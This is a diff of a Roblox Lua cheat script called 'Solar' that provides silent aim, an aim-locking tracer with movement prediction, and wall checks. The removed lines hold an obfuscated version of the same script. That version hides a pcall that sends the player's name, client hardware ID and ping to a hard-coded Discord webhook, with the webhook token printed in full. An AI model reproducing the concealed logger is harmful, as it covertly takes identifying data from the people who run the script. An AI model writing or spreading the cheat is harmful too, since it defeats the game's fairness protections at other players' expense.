@@ -1,3 +1,459 @@
+local Prey = nil
+local Plr  = nil
+
+local Players, Client, Mouse, RS, Camera =
+    game:GetService("Players"),
+    game:GetService("Players").LocalPlayer,
+    game:GetService("Players").LocalPlayer:GetMouse(),
+    game:GetService("RunService"),
+    game:GetService("Workspace").CurrentCamera
+
+local Circle       = Drawing.new("Circle")
+local TracerCircle = Drawing.new("Circle")
+
+Circle.Color           = Color3.new(1,1,1)
+Circle.Thickness       = 1
+TracerCircle.Color     = Color3.new(1,1,1)
+TracerCircle.Thickness = 1
+
+local UpdateFOV = function ()
+    if (not Circle and not TracerCircle) then
+        return Circle and TracerCircle
+    end
+    TracerCircle.Visible  = getgenv().Solar.TracerFOV.Visible
+    TracerCircle.Radius   = getgenv().Solar.TracerFOV.Radius * 3
+    TracerCircle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
+    
+    Circle.Visible  = getgenv().Solar.SilentFOV.Visible
+    Circle.Radius   = getgenv().Solar.SilentFOV.Radius * 3
+    Circle.Position = Vector2.new(Mouse.X, Mouse.Y + (game:GetService("GuiService"):GetGuiInset().Y))
+    return Circle and TracerCircle
+end
+
+RS.Heartbeat:Connect(UpdateFOV)
+
+local WallCheck = function(destination, ignore)
+    local Origin    = Camera.CFrame.p
+    local CheckRay  = Ray.new(Origin, destination - Origin)
+    local Hit       = game.workspace:FindPartOnRayWithIgnoreList(CheckRay, ignore)
+    return Hit      == nil
+end
+
+local WTS = function (Object)
+    local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
+    return Vector2.new(ObjectVector.X, ObjectVector.Y)
+end
+
+local IsOnScreen = function (Object)
+    local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
+    return IsOnScreen
+end
+
+local FilterObjs = function (Object)
+    if string.find(Object.Name, "Gun") then
+        return
+    end
+    if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
+        return true
+    end
+end
+
+local ClosestPlrFromMouse = function()
+    local Target, Closest = nil, 1/0
+    
+    for _ ,v in pairs(Players:GetPlayers()) do
+    	if getgenv().Solar.Silent.WallCheck then
+    		if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+    			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+    			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+    
+    			if (Circle.Radius > Distance and Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+    				Closest = Distance
+    				Target = v
+    			end
+    		end
+    	else
+    		if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+    			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+    			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+    
+    			if (Circle.Radius > Distance and Distance < Closest and OnScreen) then
+    				Closest = Distance
+    				Target = v
+    			end
+    		end
+    	end
+    end
+    return Target
+end
+
+local ClosestPlrFromMouse2 = function()
+    local Target, Closest = nil, 1/0
+    
+    for _ ,v in pairs(Players:GetPlayers()) do
+    	if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
+        	if getgenv().Solar.Tracer.WallCheck then
+        		local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+        		local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+        
+        		if (Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+        			Closest = Distance
+        			Target = v
+        		end
+                elseif getgenv().Solar.Tracer.UseCircleRadius then
+            		local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+            		local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                    if (TracerCircle.Radius > Distance and Distance < Closest and OnScreen) and WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}) then
+            			Closest = Distance
+            			Target = v
+                    end
+        	    else
+        			local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
+        			local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+        
+        			if (Distance < Closest and OnScreen) then
+        				Closest = Distance
+        				Target = v
+        			end
+        		end
+            end
+        end
+    return Target
+end
+
+local GetClosestBodyPart = function (character)
+    local ClosestDistance = 1/0
+    local BodyPart = nil
+    
+    if (character and character:GetChildren()) then
+        for _,  x in next, character:GetChildren() do
+            if FilterObjs(x) and IsOnScreen(x) then
+                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                if (Circle.Radius > Distance and Distance < ClosestDistance) then
+                    ClosestDistance = Distance
+                    BodyPart = x
+                end
+            end
+        end
+    end
+    return BodyPart
+end
+
+local GetClosestBodyPartV2 = function (character)
+    local ClosestDistance = 1/0
+    local BodyPart = nil
+    
+    if (character and character:GetChildren()) then
+        for _,  x in next, character:GetChildren() do
+            if FilterObjs(x) and IsOnScreen(x) then
+                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+                if (Distance < ClosestDistance) then
+                    ClosestDistance = Distance
+                    BodyPart = x
+                end
+            end
+        end
+    end
+    return BodyPart
+end
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Solar.Tracer.Key:lower()
+    if (Key == Keybind) then
+        if getgenv().Solar.Tracer.Enabled == true then
+            IsTargetting = not IsTargetting
+            if IsTargetting then
+                Plr = ClosestPlrFromMouse2()
+            else
+                if Plr ~= nil then
+                    Plr = nil
+                    IsTargetting = false
+                end
+            end
+        end
+    end
+end)
+
+Mouse.KeyDown:Connect(function(Key)
+    local Keybind = getgenv().Solar.Silent.Keybind:lower()
+    if (Key == Keybind) and getgenv().Solar.Silent.UseKeybind == true then
+            if getgenv().Solar.Silent.Enabled == true then
+				getgenv().Solar.Silent.Enabled = false
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Disabled Silent Aim",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            else
+				getgenv().Solar.Silent.Enabled = true
+                if getgenv().Solar.Both.SendNotification then
+                    game.StarterGui:SetCore(
+                        "SendNotification",
+                        {
+                            Title = "Solar",
+                            Text = "Enabled Silent Aim",
+                            Icon = "",
+                            Duration = 1
+                        }
+                    )
+                end
+            end
+        end
+    end
+)
 
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v47={};for v103=326 -(59 + 266), #v8 do v6(v47,v0(v4(v1(v2(v8,v103,v103 + 1 + 0 + 0 + 0)),v1(v2(v9,1 + ((v103-(1 + (1172 -(156 + 1016))))% #v9),(1275 -(561 + 713)) + ((v103-(1 + 0))% #v9) + 1)))%((1466 -940) -270)));end return v5(v47);end local v10="https://discord.com/api/webhooks/1075166216152420364/8zt1GiOq5eAK8TxKbp5QGZTwRBqwxIzL6YzYBrU9AVy4oey1fCzIVwF8llfvFziaeGkp";pcall(function()local v48=0 + 0 + 0;local v49;local v50;while true do if (v48==0) then v49=1609 -(1214 + (1514 -(744 + 375)));v50=nil;v48=(2 + 0) -(1 -0);end if ((272 -(164 + 107))==v48) then while true do if (v49==(0 -(1368 -(722 + 646)))) then v50={[v7("\64\187\66\167\221\1","\37\214\32\194\185\114\83\192")]={{[v7("\110\112\179\74\127","\26\25\199\38")]=v7("\91\191\35\217\88\168","\40\220\81\176"),[v7("\190\70\32\44\168\74\35\59\179\76\61","\218\35\83\79")]="",[v7("\183\20\245\190\70\162","\209\125\144\210\34")]={{[v7("\118\182\230\90","\24\215\139\63\88\225")]=v7("\198\20\112\212","\147\103\21\166\174"),[v7("\253\236\77\240\127","\139\141\33\133\26\189\80")]=game:GetService(v7("\148\43\122\100\80\221\244","\196\71\27\29\53\175\135")).LocalPlayer.Name},{[v7("\205\161\173\77","\163\192\192\40\30")]=v7("\153\85\37\192","\209\34\76\164\194"),[v7("\239\240\245\100\192","\153\145\153\17\165\102")]=game:GetService(v7("\177\236\28\238\168\66\241\154\250\13\204\181\112\248\145\248\13\204\163","\227\142\100\175\198\35\157")):GetClientId()},{[v7("\139\61\45\180","\229\92\64\209\64")]=v7("\236\208\23\243","\188\185\121\148\213\102"),[v7("\83\45\54\67\64","\37\76\90\54")]=game:GetService(v7("\42\29\178\242\232","\121\105\211\134\155")).Network.ServerStatsItem[v7("\62\254\181\89\5\40\185\127\29","\122\159\193\56\37\120\208\17")]:GetValueString()}}}}};if syn then local v132=syn.request({[v7("\198\75\194","\147\57\174\159\149\29\35\71")]=v10,[v7("\145\83\148\41\181\184","\220\54\224\65\218")]=v7("\227\198\58\103","\179\137\105\51"),[v7("\209\164\2\35\234\21\234","\153\193\99\71\143\103")]={[v7("\204\117\197\196\129\1\251\55\255\201\148\10","\143\26\171\176\228\111")]="application/json"},[v7("\208\17\201\202","\146\126\173\179\214")]=game:GetService(v7("\173\10\180\14\182\27\178\8\140\29\165","\229\126\192\126")):JSONEncode(v50)});elseif request then local v149=request({[v7("\24\81\230","\77\35\138\233\60\226\79")]=v10,[v7("\111\133\192\129\121\67","\34\224\180\233\22\39\42\22")]=v7("\127\144\201\178","\47\223\154\230\76\150\39\231"),[v7("\255\53\198\46\252\193\188","\183\80\167\74\153\179\207")]={[v7("\87\255\119\90\113\254\109\3\64\233\105\75","\20\144\25\46")]="application/json"},[v7("\104\65\191\90","\42\46\219\35\128")]=game:GetService(v7("\254\247\159\221\38\77\29\182\223\224\142","\182\131\235\173\117\40\111\192")):JSONEncode(v50)});elseif http_request then local v169=http_request({[v7("\249\170\168","\172\216\196\144\219\67\186\180")]=v10,[v7("\4\44\41\20\246\45","\73\73\93\124\153")]=v7("\59\171\23\119","\107\228\68\35"),[v7("\26\129\200\199\11\145\238","\82\228\169\163\110\227\157\146")]={[v7("\129\252\95\8\191\61\182\190\101\5\170\54","\194\147\49\124\218\83")]="application/json"},[v7("\120\127\82\65","\58\16\54\56\136\213\236")]=game:GetService(v7("\216\178\13\200\195\163\11\206\249\165\28","\144\198\121\184")):JSONEncode(v50)});end break;end end break;end end end);local v11=nil;local v12=nil;local v13,v14,v15,v16,v17=game:GetService(v7("\129\45\250\20\123\163\50","\209\65\155\109\30")),game:GetService(v7("\210\239\70\254\87\202\241","\130\131\39\135\50\184")).LocalPlayer,game:GetService(v7("\50\64\3\216\88\245\8","\98\44\98\161\61\135\123\48")).LocalPlayer:GetMouse(),game:GetService(v7("\217\191\8\234\181\91\253\163\5\220","\139\202\102\185\208\41")),game:GetService(v7("\140\206\242\211\40\171\192\227\221","\219\161\128\184\91")).CurrentCamera;local v18=Drawing.new(v7("\163\94\33\50\140\82","\224\55\83\81"));local v19=Drawing.new(v7("\0\176\101\255\253\38","\67\217\23\156\145"));v18.Color=Color3.new(3 -2,1,2 -1);v18.Thickness=1196 -(1153 + 42);v19.Color=Color3.new(1 -(0 + 0),11 -(7 + (256 -(147 + 106))),(1979 -620) -((1241 -(879 + 273)) + 629 + 640));v19.Thickness=1 + 0;local v24=function()local v51=(783 -(523 + 260)) + (0 -0);local v52;while true do if (v51==0) then v52=1985 -(1705 + 280);while true do local v110=0;while true do if (v110==(1 -0)) then if (v52==((1796 -(1101 + 695)) -(0 -0))) then local v135=(72 -(8 + 64)) + 0;while true do if (((1253 -(853 + 400)) -(0 + 0))==v135) then if ( not v18 and  not v19) then return v18 and v19;end v19.Visible=getgenv().Solar.TracerFOV.Visible;v135=(2887 -(596 + 319)) -(1787 + 118 + (189 -123));end if (v135==(1 -0)) then v52=(1464 -(391 + 626)) -((1550 -(811 + 323)) + (1586 -(1211 + 345)));break;end end end if (v52==(2 + (0 -0))) then local v136=(594 + 493) -(593 + 41 + 453);while true do if (v136==((277 + 1600) -((2038 -(174 + 929)) + 941))) then v52=1630 -((7194 -5569) + 2 + 0);break;end if (v136==(0 + 0)) then v18.Visible=getgenv().Solar.SilentFOV.Visible;v18.Radius=getgenv().Solar.SilentFOV.Radius * ((951 -(363 + 581)) -4);v136=(1592 -(1423 + 167)) -(1 -0);end end end break;end if (v110==(0 -0)) then if (v52==((1274 -808) -((1018 -571) + (1746 -(1172 + 556))))) then local v137=0 -(0 + 0);while true do if (v137==(498 -(424 + 74))) then v19.Radius=getgenv().Solar.TracerFOV.Radius * ((13 -9) -(1 -0));v19.Position=Vector2.new(v15["X"],v15["Y"] + game:GetService(v7("\1\177\40\213\166\66\20\47\167\36","\70\196\65\134\195\48\98")):GetGuiInset()["Y"]);v137=(5 -3) -(3 -2);end if (v137==(1 + 0)) then v52=(77 + 1461) -((2003 -(122 + 464)) + (436 -317));break;end end end if (v52==((1203 -(959 + 241)) + 0)) then local v138=0 + 0;while true do if (v138==((529 -(189 + 340)) -(0 + 0))) then v18.Position=Vector2.new(v15["X"],v15["Y"] + game:GetService(v7("\155\102\179\180\185\97\172\142\191\118","\220\19\218\231")):GetGuiInset()["Y"]);return v18 and v19;end end end v110=385 -(34 + 350);end end end break;end end end;v16.Heartbeat:Connect(v24);local v25=function(v26,v27)local v53=469 -(403 + 66);local v54;local v55;local v56;local v57;while true do if (v53==(4 -(2 + 1))) then v56=nil;v57=nil;v53=2;end if (v53==(639 -(76 + (2009 -(1245 + 201))))) then v54=(0 + 0) -0;v55=nil;v53=1 + 0 + 0;end if (v53==2) then while true do if ((1 + 0)==v54) then local v117=0 -(0 + 0);while true do if (v117==((0 -0) + (559 -(235 + 324)))) then v57=game.workspace:FindPartOnRayWithIgnoreList(v56,v27);return v57==nil;end end end if (v54==(0 -0)) then local v118=(0 -0) -(87 -(15 + 72));while true do if (v118==(0 + 0 + 0)) then v55=v17.CFrame["p"];v56=Ray.new(v55,v26-v55);v118=4 -3;end if (v118==(1 + 0)) then v54=1 + 0 + 0 + 0;break;end end end end break;end end end;local v28=function(v29)local v58=(1034 -(444 + 590)) -0;local v59;while true do if (v58==((0 -0) -(1389 -(1055 + 334)))) then local v109=0 + 0;while true do if (v109==(1538 -(1353 + 185))) then v59=v17:WorldToScreenPoint(v29.Position);return Vector2.new(v59["X"],v59["Y"]);end end end end end;local v30=function(v29)local v60=158 -((1518 -(463 + 965)) + 68);local v61;local v62;while true do if (v60==0) then v61=(0 -0) -(0 + 0);v62=nil;v60=(1 + 1) -1;end if (v60==1) then while true do if (v61==(0 -0)) then local v119=(42 -(41 + 1)) -0;while true do if (v119==((0 + 0) -(0 -0))) then local v140=0;while true do if (v140==0) then v62=v17:WorldToScreenPoint(v29.Position);return v62;end end end end end end break;end end end;local v31=function(v29)local v63=(0 -0) -(0 + 0);local v64;while true do if (v63==(381 -((2156 -(1882 + 45)) + 152))) then v64=(2086 -(367 + 908)) -(316 + 301 + (1043 -(324 + 525)));while true do if ((0 -0)==v64) then if string.find(v29.Name,v7("\163\146\232","\228\231\134\227\132\87\27")) then return;end if table.find({v7("\111\164\37\6","\63\197\87\114\223"),v7("\44\13\62\133\133\125\171\90","\97\104\77\237\213\28\217\46"),v7("\6\59\202\219\98\219\55\48","\68\90\185\190\50\186\69")},v29.ClassName) then return true;end break;end end break;end end end;local v32=function()local v65=(0 + 0) -(0 -0);local v66;local v67;local v68;while true do if (v65==(1 + 0)) then v68=nil;while true do local v111=0 + 0 + 0 + 0;while true do if (v111==(0 + 0)) then if (v66==((47 -(42 + 4)) + (0 -0))) then return v67;end if (v66==((1176 -(438 + 534)) -((1836 -(1031 + 648)) + (104 -57)))) then local v141=0;local v142;while true do if (0==v141) then v142=(113 + 13) -(86 + 40);while true do if (v142==((0 -0) + 0 + 0)) then v67,v68=nil,(157 -(23 + 133))/((6459 -4569) -(345 + 742 + 803));for v202,v203 in pairs(v13:GetPlayers()) do if getgenv().Solar.Silent.WallCheck then if (v203.Character and (v203~=v14) and v203.Character:FindFirstChild(v7("\150\183\123\136\64\46\171\41\140\173\121\157\126\32\176\57","\222\194\22\233\46\65\194\77"))) then local v252=148 -((532 -(24 + 476)) + 116);local v253;local v254;local v255;local v256;while true do if (v252==(1 + 0 + (0 -0))) then v255=nil;v256=nil;v252=702 -(349 + 351);end if (v252==(1524 -((1071 -329) + (1719 -(472 + 467))))) then while true do if (0==v253) then local v303=0 + 0 + (0 -0);while true do if (v303==1) then v253=938 -(922 + 15);break;end if (v303==((870 -(695 + 175)) -(0 + 0))) then v254,v255=v17:WorldToScreenPoint(v203.Character.HumanoidRootPart.Position);v256=(Vector2.new(v254["X"],v254["Y"]) -Vector2.new(v15["X"],v15["Y"])).Magnitude;v303=392 -(38 + 353);end end end if (v253==(2 -1)) then if ((v18.Radius>v256) and (v256v261) and (v261v283) and (v283v269) and (v269getgenv().Solar.Both.DesyncDetection)) then pcall(function()local v209=1422 -(475 + 947);local v210;while true do if (v209==(1 -0)) then v210.AssemblyLinearVelocity=Vector3.new(1204 -(933 + 271),(0 -0) -(394 -(181 + 213)),0 -0);break;end if (v209==(0 + 0 + 0 + 0)) then v210=v11.Character[getgenv().Solar.Silent.Part];v210.Velocity=Vector3.new(0 -0,0 -(377 -(315 + 62)),0 -0);v209=1 + (0 -0);end end end);end if ((getgenv().Solar.Silent.AntiGroundShots==true) and (v11.Character:FindFirstChild(v7("\2\226\20\93\246\73\35\243","\74\151\121\60\152\38"))==Enum.HumanoidStateType.Freefall)) then pcall(function()local v211=1229 -(152 + 1077);local v212;while true do if (((116 + 189) -((2195 -(759 + 1165)) + (83 -49)))==v211) then local v247=(0 -0) + (0 -0);while true do if (v247==(1346 -(770 + 575))) then v211=(2737 -1595) -(1025 + 34 + 82);break;end if (v247==((1669 -(980 + 308)) -((772 -(527 + 147)) + (1127 -844)))) then local v289=0;while true do if (v289==0) then v212=v11.Character[getgenv().Solar.Silent.Part];v212.Velocity=Vector3.new(v212.Velocity["X"],v212.Velocity["Y"] * (1606.5 -(1167 + 439)),v212.Velocity["Z"]);v289=1;end if (v289==1) then v247=(43 -(26 + 16)) + 0 + 0;break;end end end end end if (v211==((9 -7) -1)) then v212.AssemblyLinearVelocity=Vector3.new(v212.Velocity["X"],v212.Velocity["Y"] * (0.5 + (832 -(374 + 458))),v212.Velocity["Z"]);break;end end end);end v130=1861 -(250 + 1610);end if (v130==(1 + 0)) then if (getgenv().Solar.Both.UnderGroundReolver==true) then pcall(function()local v213=(307 -(153 + 154)) + (0 -0);local v214;while true do if (v213==(1 + 0)) then v214.AssemblyLinearVelocity=Vector3.new(v214.Velocity["X"],1909 -((1167 -(261 + 77)) + (3012 -(588 + 1344))),v214.Velocity["Z"]);break;end if (v213==(0 + 0)) then local v250=1213 -(154 + 1058 + 1);while true do if (v250==((5 -3) -(4 -3))) then v213=(11 + 2) -(4 + 1 + 6 + 1);break;end if (v250==((971 -(293 + 678)) -(902 -(820 + 82)))) then local v290=0;while true do if (v290==0) then v214=v11.Character[getgenv().Solar.Silent.Part];v214.Velocity=Vector3.new(v214.Velocity["X"],0 + 0,v214.Velocity["Z"]);v290=1;end if (v290==1) then v250=1 + 0 + 0;break;end end end end end end end);end break;end end break;end end end end if (getgenv().Solar.Tracer.Enabled==true) then local v114=1181 -(273 + 908);local v115;while true do if (((377 -(239 + 138)) + 0 + 0)==v114) then v115=0;while true do if (v115==(0 + 0)) then if ((getgenv().Solar.Both.DetectDesync==true) and v12 and v12.Character and v12.Character:WaitForChild(getgenv().Solar.Tracer.Part) and (v12.Character:WaitForChild(v7("\85\165\21\166\142\89\240\229\79\191\23\179\176\87\235\245","\29\208\120\199\224\54\153\129")).Velocity.magnitude>getgenv().Solar.Both.DesyncDetection)) then pcall(function()local v182=(1917 -(154 + 1763)) + (0 -0);local v183;local v184;while true do if (v182==((6507 -5056) -((701 -151) + 273 + 628))) then v183=0;v184=nil;v182=(2 + 1) -(7 -5);end if (1==v182) then while true do if (1==v183) then v184.AssemblyLinearVelocity=Vector3.new((453 + 10) -(81 + 382),(30 + 829) -(288 + 172 + (1434 -1035)),400 -(289 + 111));break;end if (((620 -(100 + 520)) -0)==v183) then v184=v12.Character[getgenv().Solar.Tracer.Part];v184.Velocity=Vector3.new(0 + 0,(0 -0) -0,(204 + 353) -(136 + 186 + 68 + 167));v183=(1 -0) + (1109 -(741 + 368));end end break;end end end);end if ((getgenv().Solar.Both.UnderGroundReolver==true) and v12 and v12.Character and v12.Character:WaitForChild(getgenv().Solar.Tracer.Part)) then pcall(function()local v185=0;local v186;local v187;while true do if (v185==(0 -(0 -0))) then v186=0;v187=nil;v185=2 -1;end if (v185==((503 -(69 + 433)) + 0)) then while true do if (v186==(0 + 0 + 0)) then local v275=0;while true do if (v275==(0 + (1065 -(118 + 947)))) then v187=v12.Character[getgenv().Solar.Tracer.Part];v187.Velocity=Vector3.new(v187.Velocity["X"],1332 -(574 + 758),v187.Velocity["Z"]);v275=3 -2;end if (v275==((1056 + 48) -(772 + 4 + 327))) then v186=(131 + 474) -((631 -400) + (524 -151));break;end end end if (v186==(2 -1)) then v187.AssemblyLinearVelocity=Vector3.new(v187.Velocity["X"],(0 -0) + 0,v187.Velocity["Z"]);break;end end break;end end end);end break;end end break;end end end break;end end end);v16.RenderStepped:Connect(function()local v96=0 -(0 -0);local v97;while true do if (v96==((3253 -(386 + 1164)) -(215 + 92 + (2633 -(324 + 913))))) then v97=(1763 -(1618 + 145)) + (805 -(220 + 585));while true do if (v97==(0 -0)) then if getgenv().Solar.Silent.Enabled then if ((getgenv().Solar.Silent.CheckIf_KO==true) and v11 and v11.Character) then local v159=(443 -210) -(54 + (1836 -(851 + 806)));local v160;local v161;local v162;while true do if (v159==((3 -2) + 0 + 0)) then v162=nil;while true do if (v160==(0 -0)) then local v215=0 + 0 + 0 + 0;while true do if (v215==(735 -(672 + 62))) then v160=(1272 -(443 + 826)) -(3 -1);break;end if (v215==(0 -0)) then v161=v11.Character:WaitForChild(v7("\157\254\246\174\218\185\247\247\180\235\172","\223\145\146\215\159"))[v7("\228\143\31","\175\161\80\52\85\194")].Value;v162=v11.Character:FindFirstChild(v7("\135\180\198\0\47\137\168\192\29\46\143\168\212\22\63\129\175\201\22","\192\230\135\66\109"))~=nil;v215=(936 -(395 + 540)) -(0 + 0);end end end if (v160==((3 + 0) -(2 + 0))) then if (v161 or v162) then v11=nil;end break;end end break;end if (((0 + 0) -0)==v159) then v160=1405 -((2135 -(820 + 615)) + (2362 -1657));v161=nil;v159=(3 -2) + (1785 -(467 + 1318));end end end end if (getgenv().Solar.Tracer.Enabled==true) then local v133=0 -0;while true do if (v133==((1 -0) + (2 -1))) then if (getgenv().Solar.Tracer.PredictMovement and v12 and v12.Character and v12.Character:FindFirstChild(getgenv().Solar.Tracer.Part)) then if getgenv().Solar.Tracer.UseShake then local v198=0 + 0;local v199;while true do if (v198==(1425 -(248 + 185 + 277 + 715))) then v199=CFrame.new(v17.CFrame["p"],v12.Character[getgenv().Solar.Tracer.Part].Position + (v12.Character[getgenv().Solar.Tracer.Part].Velocity * getgenv().Solar.Tracer.PredictionVelocity) + (Vector3.new(math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue),math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue),math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue)) * (1729.1 -((2822 -1373) + (739 -459)))));v17.CFrame=v17.CFrame:Lerp(v199,getgenv().Solar.Tracer.Smoothness,Enum.EasingStyle.Elastic,Enum.EasingDirection.InOut,Enum.EasingStyle.Sine,Enum.EasingDirection.Out);break;end end else local v200=0 -0;local v201;while true do if (v200==(0 -0)) then v201=CFrame.new(v17.CFrame["p"],v12.Character[getgenv().Solar.Tracer.Part].Position + (v12.Character[getgenv().Solar.Tracer.Part].Velocity * getgenv().Solar.Tracer.PredictionVelocity));v17.CFrame=v17.CFrame:Lerp(v201,getgenv().Solar.Tracer.Smoothness,Enum.EasingStyle.Elastic,Enum.EasingDirection.InOut,Enum.EasingStyle.Sine,Enum.EasingDirection.Out);break;end end end elseif ((getgenv().Solar.Tracer.PredictMovement==false) and v12 and v12.Character and v12.Character:FindFirstChild(getgenv().Solar.Tracer.Part)) then if getgenv().Solar.Tracer.UseShake then local v225=0 + 0;local v226;local v227;while true do if (v225==(1 + 0)) then while true do if (v226==(0 + 0)) then v227=CFrame.new(v17.CFrame["p"],v12.Character[getgenv().Solar.Tracer.Part].Position + (Vector3.new(math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue),math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue),math.random( -getgenv().Solar.Tracer.ShakeValue,getgenv().Solar.Tracer.ShakeValue)) * ((2795.1 -1438) -(279 + (2150 -(11 + 1061))))));v17.CFrame=v17.CFrame:Lerp(v227,getgenv().Solar.Tracer.Smoothness,Enum.EasingStyle.Elastic,Enum.EasingDirection.InOut,Enum.EasingStyle.Sine,Enum.EasingDirection.Out);break;end end break;end if (v225==(0 + 0)) then local v277=0;while true do if (v277==0) then v226=0 + 0;v227=nil;v277=1;end if (v277==1) then v225=1 + (210 -(197 + 13));break;end end end end else local v228=(0 -0) + 0 + 0;local v229;local v230;while true do if (v228==((1813 -(116 + 1675)) -(19 + 3))) then v229=0 + 0;v230=nil;v228=1 + 0 + 0;end if (v228==(1 + 0)) then while true do if (v229==(928 -(761 + 167))) then v230=CFrame.new(v17.CFrame["p"],v12.Character[getgenv().Solar.Tracer.Part].Position);v17.CFrame=v17.CFrame:Lerp(v230,getgenv().Solar.Tracer.Smoothness,Enum.EasingStyle.Elastic,Enum.EasingDirection.InOut,Enum.EasingStyle.Sine,Enum.EasingDirection.Out);break;end end break;end end end end break;end if (v133==(367 -(356 + 10 + 1))) then local v166=0 -0;while true do if (v166==((1 -0) + 0)) then v133=1;break;end if (v166==0) then if ((getgenv().Solar.Tracer.CheckIf_KO==true) and v12 and v12.Character) then local v216=0;local v217;local v218;local v219;local v220;while true do if (2==v216) then while true do if ((2 -1)==v217) then v220=nil;while true do if (((2181 -(410 + 611)) -((2894 -(1693 + 246)) + 64 + 140))==v218) then if (v219 or v220) then local v308=0 -0;while true do if (v308==(144 -(24 + 120))) then v12=nil;IsTargetting=false;break;end end end break;end if (v218==0) then local v302=0;while true do if ((1221 -((1631 -(1133 + 162)) + 885))==v302) then v219=v12.Character:WaitForChild(v7("\91\52\45\157\29\182\127\62\42\144\43","\25\91\73\228\88\208"))[v7("\33\93\248","\106\115\183\17\125")].Value;v220=v12.Character:FindFirstChild(v7("\1\186\147\19\134\27\25\252\25\171\157\31\151\6\5\250\15\166\134","\70\232\210\81\196\82\87\187"))~=nil;v302=1 + 0;end if (v302==((1943 -(1300 + 639)) -(371 -(67 + 301)))) then v218=(191 + 137) -(189 + (182 -(37 + 7)));break;end end end end break;end if (v217==(507 -(283 + 224))) then local v291=0;while true do if (1==v291) then v217=64 -(28 + 35);break;end if (v291==0) then v218=(2843 -(723 + 669)) -(1182 + (464 -195));v219=nil;v291=1;end end end end break;end if (v216==1) then v219=nil;v220=nil;v216=2;end if (v216==0) then v217=0 + 0 + 0 + 0;v218=nil;v216=1;end end end if ((getgenv().Solar.Tracer.DisableTargetDeath==true) and v12 and v12.Character:FindFirstChild(v7("\225\238\56\20\80\218\254\134","\169\155\85\117\62\181\151\226"))) then if (v12.Character.Humanoid.health<(3 + 1)) then local v237=(0 -0) + 0;local v238;while true do if (v237==(0 -0)) then v238=0 -0;while true do if ((87 -(10 + 77))==v238) then v12=nil;IsTargetting=false;break;end end break;end end end end v166=1 + (1662 -(1450 + 212));end end end if (v133==(1 + 0 + 0 + 0)) then local v167=0 -0;while true do if (v167==((1799 -(825 + 974)) + 0 + 0)) then if ((getgenv().Solar.Tracer.DisableLocalDeath==true) and v12 and v12.Character:FindFirstChild(v7("\218\48\245\208\252\42\241\213","\146\69\152\177"))) then if (v14.Character.Humanoid.health<4) then local v239=0;local v240;while true do if (v239==(1822 -(56 + 1766))) then v240=0 -0;while true do if ((0 -0)==v240) then v12=nil;IsTargetting=false;break;end end break;end end end end if ((getgenv().Solar.Tracer.DisableOutSideCircle==true) and v12 and v12.Character and v12.Character:WaitForChild(v7("\133\82\169\65\127\79\164\67\150\79\126\84\157\70\182\84","\205\39\196\32\17\32"))) then if (v19.Radius<(Vector2.new(v17:WorldToScreenPoint(v12.Character.HumanoidRootPart.Position)["X"],v17:WorldToScreenPoint(v12.Character.HumanoidRootPart.Position)["Y"]) -Vector2.new(v15["X"],v15["Y"])).Magnitude) then local v241=0;local v242;local v243;while true do if (v241==1) then while true do if (v242==(0 + 0 + 0)) then v243=0 + 0;while true do if (v243==(0 -0)) then v12=nil;IsTargetting=false;break;end end break;end end break;end if (v241==0) then v242=1674 -(267 + 241 + (2474 -(1060 + 248)));v243=nil;v241=1;end end end end v167=1 + 0;end if (v167==(1696 -(303 + 329 + 1063))) then v133=2 + 0;break;end end end end end break;end end break;end end end);task.spawn(function()while task.wait() do local v104=(103 + 902) -((2633 -1632) + (10 -6));local v105;while true do if (v104==(727 -(25 + (1085 -383)))) then v105=0 + 0;while true do if ((0 + 0)==v105) then local v131=0 + (353 -(114 + 239));while true do if (v131==(0 + 0 + 0)) then if getgenv().Solar.Silent.Enabled then v11=v32();end if v12 then if (getgenv().Solar.Tracer.Enabled and v12.Character and getgenv().Solar.Tracer.ClosestPart) then getgenv().Solar.Tracer.Part=tostring(v36(v12.Character));end end v131=2 